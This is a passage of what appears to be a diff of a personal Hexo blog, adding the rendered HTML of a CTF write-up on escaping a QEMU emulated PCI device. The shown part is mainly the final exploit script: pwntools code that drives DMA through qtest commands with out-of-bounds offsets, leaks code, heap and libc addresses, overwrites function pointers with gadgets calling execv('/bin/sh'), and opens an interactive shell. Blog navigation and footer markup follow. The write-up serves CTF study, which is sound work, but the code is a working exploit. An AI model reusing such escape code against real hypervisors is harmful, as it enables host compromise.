class="string">"OK"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_idx</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">"readq &#123;&#125;"</span>.format(BASE+<span class="number">8</span>))</span><br><span class="line">    ru(<span class="string">"OK"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_src</span><span class="params">(addr)</span>:</span></span><br><span class="line">    sl(<span class="string">"writeq &#123;&#125; &#123;&#125;"</span>.format(BASE+<span class="number">0x10</span>, addr))</span><br><span class="line">    ru(<span class="string">"OK"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_dst</span><span class="params">(addr)</span>:</span></span><br><span class="line">    sl(<span class="string">"writeq &#123;&#125; &#123;&#125;"</span>.format(BASE+<span class="number">0x18</span>, addr))</span><br><span class="line">    ru(<span class="string">"OK"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_cnt</span><span class="params">(num)</span>:</span></span><br><span class="line">    sl(<span class="string">"writeq &#123;&#125; &#123;&#125;"</span>.format(BASE+<span class="number">0x20</span>, num))</span><br><span class="line">    ru(<span class="string">"OK"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_cmd</span><span class="params">(num)</span>:</span></span><br><span class="line">    sl(<span class="string">"writeq &#123;&#125; &#123;&#125;"</span>.format(BASE+<span class="number">0x28</span>, num))</span><br><span class="line">    ru(<span class="string">"OK"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_dma</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">"readq &#123;&#125;"</span>.format(BASE+<span class="number">0x30</span>))</span><br><span class="line">    ru(<span class="string">"OK "</span>)</span><br><span class="line">    ru(<span class="string">"OK "</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># device -&gt; as </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_write</span><span class="params">(idx, src, dst, cnt)</span>:</span></span><br><span class="line">    set_idx(idx)</span><br><span class="line">    set_src(src)</span><br><span class="line">    set_dst(dst)</span><br><span class="line">    set_cnt(cnt)</span><br><span class="line">    set_cmd(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># as -&gt; device </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_read</span><span class="params">(idx, src, dst, cnt)</span>:</span></span><br><span class="line">    set_idx(idx)</span><br><span class="line">    set_src(src)</span><br><span class="line">    set_dst(dst)</span><br><span class="line">    set_cnt(cnt)</span><br><span class="line">    set_cmd(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_as</span><span class="params">(addr, value)</span>:</span></span><br><span class="line">    sl(<span class="string">"writeq &#123;&#125; &#123;&#125;"</span>.format(addr, value))</span><br><span class="line">    ru(<span class="string">"OK"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_as</span><span class="params">(addr)</span>:</span></span><br><span class="line">    sl(<span class="string">"readq &#123;&#125;"</span>.format(addr))</span><br><span class="line">    ru(<span class="string">"OK "</span>)</span><br><span class="line">    content = ru(<span class="string">"\n"</span>)</span><br><span class="line">    ru(<span class="string">"OK "</span>)</span><br><span class="line">    <span class="keyword">return</span> int(content, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_clock</span><span class="params">(ns)</span>:</span></span><br><span class="line">    sl(<span class="string">"clock_step &#123;&#125;"</span>.format(ns))</span><br><span class="line">    ru(<span class="string">"OK"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writeb64</span><span class="params">(addr, value)</span>:</span></span><br><span class="line">    encoded = b64e(value)</span><br><span class="line">    sl(<span class="string">"b64write &#123;&#125; &#123;&#125; &#123;&#125;"</span>.format(addr, len(value), encoded))</span><br><span class="line">    ru(<span class="string">"OK"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readb64</span><span class="params">(addr, sz)</span>:</span></span><br><span class="line">    sl(<span class="string">"b64read &#123;&#125; &#123;&#125;"</span>.format(addr, sz))</span><br><span class="line">    ru(<span class="string">"OK "</span>)</span><br><span class="line">    content = ru(<span class="string">"\n"</span>)</span><br><span class="line">    ru(<span class="string">"OK "</span>)</span><br><span class="line">    <span class="keyword">return</span> b64d(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getoff</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> x &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span> &lt;&lt; <span class="number">64</span>) + x</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">U = <span class="number">0x40000</span></span><br><span class="line">set_size(<span class="number">32</span>)</span><br><span class="line">fake = <span class="string">""</span></span><br><span class="line">fake += p64((<span class="number">1</span>&lt;&lt;<span class="number">64</span>)<span class="number">-0xe00</span>) <span class="comment"># src</span></span><br><span class="line">fake += p64(U+<span class="number">0x1000</span>) <span class="comment"># dst</span></span><br><span class="line">fake += p64(<span class="number">0x1000</span>) <span class="comment"># cnt</span></span><br><span class="line">fake += p64(<span class="number">1</span>) <span class="comment">#cmd</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak code</span></span><br><span class="line">writeb64(U, fake)</span><br><span class="line">new_read(<span class="number">0</span>, U, (<span class="number">1</span>&lt;&lt;<span class="number">64</span>)<span class="number">-32</span>, <span class="number">32</span>)</span><br><span class="line">do_dma()</span><br><span class="line">content = readb64(U+<span class="number">0x1000</span>, <span class="number">0x10</span>)</span><br><span class="line">leak_code = uu64(content[<span class="number">8</span>:])</span><br><span class="line">code = leak_code - <span class="number">0x2d4ec0</span></span><br><span class="line">info_addr(<span class="string">"code"</span>, code)</span><br><span class="line">system = code + <span class="number">0x2d6be0</span></span><br><span class="line">binsh = code + <span class="number">0xa70098</span></span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">leak_heap = read_as(U+<span class="number">0x1000</span>+<span class="number">0xc0</span>)</span><br><span class="line">info_addr(<span class="string">"heap"</span>, leak_heap)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">free_got = code + <span class="number">0x1110ce0</span></span><br><span class="line">this_buf = leak_heap + <span class="number">0xe00</span></span><br><span class="line">info_addr(<span class="string">"free_got"</span>, free_got)</span><br><span class="line">info_addr(<span class="string">"this_buf"</span>, this_buf)</span><br><span class="line">off = getoff(free_got - this_buf)</span><br><span class="line">info_addr(<span class="string">"off"</span>, off)</span><br><span class="line">fake = <span class="string">""</span></span><br><span class="line">fake += p64(off) <span class="comment"># dst</span></span><br><span class="line">fake += p64(U+<span class="number">0x1000</span>) <span class="comment"># src</span></span><br><span class="line">fake += p64(<span class="number">0x8</span>) <span class="comment"># cnt</span></span><br><span class="line">fake += p64(<span class="number">1</span>) <span class="comment">#cmd</span></span><br><span class="line">writeb64(U, fake)</span><br><span class="line">new_read(<span class="number">0</span>, U, (<span class="number">1</span>&lt;&lt;<span class="number">64</span>)<span class="number">-32</span>, <span class="number">32</span>)</span><br><span class="line">new_read(<span class="number">31</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">do_dma()</span><br><span class="line">leak_libc = read_as(U+<span class="number">0x1000</span>)</span><br><span class="line">info_addr(<span class="string">"leak_libc"</span>, leak_libc)</span><br><span class="line">libc = leak_libc - <span class="number">0x9d850</span></span><br><span class="line">info_addr(<span class="string">"libc"</span>, libc)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x0000000014bd1e: mov rsi, [rbx+0x10]; mov rdx, r12; mov rdi, r14; call qword ptr [rax+0x20];</span></span><br><span class="line">gadget1 = libc + <span class="number">0x14bd1e</span></span><br><span class="line">gadget2 = code + <span class="number">0x3d2f05</span> <span class="comment"># mov rdi, "/bin/sh"; call execv</span></span><br><span class="line">info_addr(<span class="string">"gadget1"</span>, gadget1)</span><br><span class="line">info_addr(<span class="string">"gadget2"</span>, gadget2)</span><br><span class="line">data = p64(gadget2) + p64(gadget1)</span><br><span class="line">writeb64(U+<span class="number">0x1000</span>, data)</span><br><span class="line"></span><br><span class="line">fake = <span class="string">""</span></span><br><span class="line">fake += p64(U+<span class="number">0x1000</span>)</span><br><span class="line">fake += p64(getoff(<span class="number">-0xe00</span> + <span class="number">0x20</span>)) <span class="comment"># rdi+0x20</span></span><br><span class="line">fake += p64(<span class="number">8</span>)</span><br><span class="line">fake += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake += p64(U+<span class="number">0x1008</span>)</span><br><span class="line">fake += p64(getoff(<span class="number">-0xe00</span> + <span class="number">0x460</span>))</span><br><span class="line">fake += p64(<span class="number">8</span>)</span><br><span class="line">fake += p64(<span class="number">0</span>)</span><br><span class="line">writeb64(U, fake)</span><br><span class="line">new_read(<span class="number">0</span>, U, (<span class="number">1</span>&lt;&lt;<span class="number">64</span>)<span class="number">-0x40</span>, <span class="number">0x40</span>)</span><br><span class="line">new_read(<span class="number">31</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">do_dma()</span><br><span class="line"></span><br><span class="line">sl(<span class="string">"inw 3324"</span>) <span class="comment"># trigger</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol>
+<li><a href="https://qemu.readthedocs.io/en/latest/devel/qtest.html" target="_blank" rel="noopener">https://qemu.readthedocs.io/en/latest/devel/qtest.html</a></li>
+<li><a href="https://github.com/GiantVM/doc/blob/master/pci.md" target="_blank" rel="noopener">https://github.com/GiantVM/doc/blob/master/pci.md</a></li>
+<li><a href="https://blog.csdn.net/weixin_43780260/article/details/104410063" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43780260/article/details/104410063</a></li>
+</ol>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/06/15/QWB2021-Quals-EzCloud/" rel="next" title="[QWB2021 Quals] - EzCloud">
+                <i class="fa fa-chevron-left"></i> [QWB2021 Quals] - EzCloud
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/12/31/Booklist2021/" rel="prev" title="Booklist2021">
+                Booklist2021 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
 
     <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
+      
     </div>
   </div>
 
-{% endblock %}
-
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+          
+          </div>
+          
 
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="Matthew Shao">
+          <p class="site-author-name" itemprop="name">Matthew Shao</p>
+          <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+        <nav class="site-state motion-element">
+        
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">68</span>
+                <span class="site-state-item-name">文章</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">分類</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">14</span>
+                <span class="site-state-item-name">標籤</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/MatthewShao" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  Github
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Recon"><span class="nav-number">1.</span> <span class="nav-text">Recon</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#QEMU设备逆向"><span class="nav-number">2.</span> <span class="nav-text">QEMU设备逆向</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DMA逻辑"><span class="nav-number">3.</span> <span class="nav-text">DMA逻辑</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PCI设备初始化"><span class="nav-number">4.</span> <span class="nav-text">PCI设备初始化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">5.</span> <span class="nav-text">Exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Plan-A"><span class="nav-number">5.1.</span> <span class="nav-text">Plan A</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Plan-B"><span class="nav-number">5.2.</span> <span class="nav-text">Plan B</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Plan-C"><span class="nav-number">5.3.</span> <span class="nav-text">Plan C</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Plan-D"><span class="nav-number">5.4.</span> <span class="nav-text">Plan D</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp-py"><span class="nav-number">6.</span> <span class="nav-text">exp.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#References"><span class="nav-number">7.</span> <span class="nav-text">References</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Matthew Shao</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 強力驅動
+</div>
+
+<div class="theme-info">
+  主題 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Logos
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/schemes/logos.js?v=5.1.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+
+
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+
+</body>
+</html>
